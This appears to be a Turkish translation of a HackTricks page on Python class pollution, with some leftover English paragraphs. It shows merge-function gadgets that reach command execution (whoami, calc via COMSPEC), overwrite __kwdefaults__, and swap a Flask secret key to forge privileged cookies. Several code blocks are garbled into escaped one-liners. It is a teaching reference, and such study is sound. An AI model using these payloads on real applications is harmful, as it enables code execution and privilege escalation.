# Class Pollution (Python's Prototype Pollution)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Temel Örnek

Nesnelerin sınıflarını dizelerle nasıl kirletebileceğinizi kontrol edin:

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Temel Zayıflık Örneği

Consider the following Python code:

Aşağıdaki Python kodunu düşünün:

```python
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def login(self):
        # Code for logging in the user

    def logout(self):
        # Code for logging out the user

class Admin(User):
    def __init__(self, username, password):
        super().__init__(username, password)
        self.is_admin = False

    def promote_to_admin(self):
        self.is_admin = True

    def demote_from_admin(self):
        self.is_admin = False
```

In this code, we have a `User` class and an `Admin` class that inherits from the `User` class. The `User` class has an `__init__` method to initialize the `username` and `password` attributes, as well as `login` and `logout` methods. The `Admin` class adds additional functionality with the `promote_to_admin` and `demote_from_admin` methods.

Bu kodda, `User` sınıfı ve `User` sınıfından türeyen `Admin` sınıfı bulunmaktadır. `User` sınıfı, `username` ve `password` özelliklerini başlatmak için `__init__` yöntemine sahiptir ve ayrıca `login` ve `logout` yöntemlerine sahiptir. `Admin` sınıfı, `promote_to_admin` ve `demote_from_admin` yöntemleriyle ek işlevsellik ekler.

Now, let's say an attacker is able to manipulate the `User` class prototype and add a new method called `delete_account`:

Şimdi, bir saldırganın `User` sınıfının prototipini manipüle edebildiğini ve `delete_account` adında yeni bir yöntem ekleyebildiğini varsayalım:

```python
User.__dict__["delete_account"] = lambda self: print("Account deleted!")
```

The attacker can then create an instance of the `Admin` class and call the `delete_account` method, even though it was not defined in the `Admin` class:

Saldırgan, `Admin` sınıfının bir örneğini oluşturabilir ve `delete_account` yöntemini çağırabilir, bu yöntem `Admin` sınıfında tanımlanmamış olsa bile:

```python
admin = Admin("admin", "password")
admin.delete_account()  # Output: "Account deleted!"
```

This is an example of class pollution, where an attacker is able to modify the prototype of a class and add or modify its methods. In this case, the attacker was able to add a method to the `User` class and access it through an instance of the `Admin` class.

Bu, bir saldırganın bir sınıfın prototipini değiştirip yöntemlerini ekleyebileceği veya değiştirebileceği bir sınıf kirliliği örneğidir. Bu durumda, saldırgan `User` sınıfına bir yöntem ekleyebildi ve `Admin` sınıfının bir örneği üzerinden erişebildi.

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Örnek Gadget'lar

<details>

<summary>Sınıf özelliği varsayılan değerini RCE'ye (alt işlem) dönüştürme</summary>

\`\`\`python from os import popen class Employee: pass # Creating an empty class class HR(Employee): pass # Class inherits from Employee class class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class def execute\_command(self): command = self.custom\_command if hasattr(self, 'custom\_command') else 'echo Hello there' return f'\[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

USER\_INPUT = { "**class**":{ "**base**":{ "**base**":{ "custom\_command": "whoami" } } } }

recruiter\_emp = Recruiter() system\_admin\_emp = SystemAdmin()

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "echo Hello there", output: "Hello there"

## Create default value for Employee.custom\_command

merge(USER\_INPUT, recruiter\_emp)

print(system\_admin\_emp.execute\_command()) #> \[!] Executing: "whoami", output: "abdulrah33m"

````
</details>

<details>

<summary><code>globals</code> aracılığıyla diğer sınıfları ve global değişkenleri kirletme</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
````

</details>

<details>

<summary>Rastgele alt işlem yürütme</summary>

\`\`\`python import subprocess, json

class Employee: def **init**(self): pass

def merge(src, dst):

## Recursive merge function

for k, v in src.items(): if hasattr(dst, '**getitem**'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst\[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)

## Overwrite env var "COMSPEC" to execute a calc

USER\_INPUT = json.loads('{"**init**":{"**globals**":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"\}}\}}\}}') # attacker-controlled value

merge(USER\_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up

````
</details>

<details>

<summary><strong><code>__kwdefaults__</code></strong> üzerine yazma</summary>

**`__kwdefaults__`**, tüm fonksiyonların özel bir özelliğidir. Python [belgelerine](https://docs.python.org/3/library/inspect.html) göre, bu özellik "yalnızca anahtar kelime parametreleri için herhangi bir varsayılan değerlerin bir eşlemesi"dir. Bu özelliği kirletmek, bir fonksiyonun yıldızlı (\*) veya \*args'ten sonra gelen anahtar kelime parametrelerinin varsayılan değerlerini kontrol etmemizi sağlar.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
````

</details>

<details>

<summary>Flask gizli anahtarının farklı dosyalarda üzerine yazılması</summary>

Yani, webin ana python dosyasında tanımlanan ancak sınıfı ana dosyadan farklı bir dosyada tanımlanan bir nesne üzerinde sınıf kirliliği yapabilirseniz. Önceki payloadlarda \_\_globals\_\_'a erişmek için nesnenin sınıfına veya sınıfın yöntemlerine erişmeniz gerektiğinden, **o dosyadaki globals'e erişebileceksiniz, ancak ana dosyadaki globals'e erişemeyeceksiniz**.\
Bu nedenle, ana sayfada **gizli anahtar**'ı tanımlayan Flask uygulama global nesnesine **erişemezsiniz**:

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

Bu senaryoda, Flask gizli anahtarını değiştirmek ve bu anahtarı bilerek ayrıcalıkları yükseltmek için ana dosyaya erişmek için dosyalara gezinmek için bir araca ihtiyacınız vardır. Bu aracı kullanarak, Flask gizli anahtarını değiştirebilir ve [bu anahtarı bilerek ayrıcalıkları yükseltebilirsiniz](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Bu yazıdan bir örnek payload:

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

`app.secret_key`'i (uygulamanızdaki adı farklı olabilir) değiştirmek için bu payload'u kullanın, böylece yeni ve daha fazla yetkiye sahip flask çerezlerini imzalayabilirsiniz.

</details>

Ayrıca, daha fazla salt okunur gadget için aşağıdaki sayfayı da kontrol edin:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Referanslar

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
